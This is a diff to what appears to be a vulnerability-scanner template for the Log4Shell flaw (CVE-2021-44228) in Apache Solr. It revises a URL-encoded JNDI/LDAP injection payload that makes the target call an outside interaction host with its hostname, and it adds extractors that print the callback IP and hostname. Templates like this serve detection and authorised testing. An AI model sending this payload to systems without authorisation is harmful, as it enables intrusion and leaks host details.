@@ -19,15 +19,20 @@ info:
     cve-id: CVE-2021-44228
     cwe-id: CWE-77
   metadata:
+    max-request: 2
     verified: "true"
     shodan-query: http.html:"Apache Solr"
   tags: vulhub,cve,solr,oast,log4j,cve2021,rce,apache,jndi,kev
+
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
 
 http:
   - raw:
       - |
         @timeout: 25s
-        GET /solr/admin/{{endpoint}}?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7Bsys%3Aos.name%7D.{{interactsh-url}}%2F%7D HTTP/1.1
+        GET /solr/admin/{{endpoint}}?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-{{rand1}}%7D%24%7B%3A-{{rand2}}}%7D.%24%7BhostName%7D.uri.{{interactsh-url}}%2F%7D HTTP/1.1
         Host: {{Hostname}}
 
     attack: clusterbomb
@@ -51,10 +56,21 @@ http:
       - type: regex
         part: interactsh_request
         regex:
-          - '((W|w)(I|i)(N|n)(D|d)(O|o)(W|w)(S|s))|((L|l)(I|i)(N|n)(U|u)(X|x))\.' # Windows or Linux
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
     extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
       - type: regex
         part: interactsh_request
+        group: 2
         regex:
-          - '((W|w)(I|i)(N|n)(D|d)(O|o)(W|w)(S|s))|((L|l)(I|i)(N|n)(U|u)(X|x))\.' # Windows or Linux
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print injection point in output
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
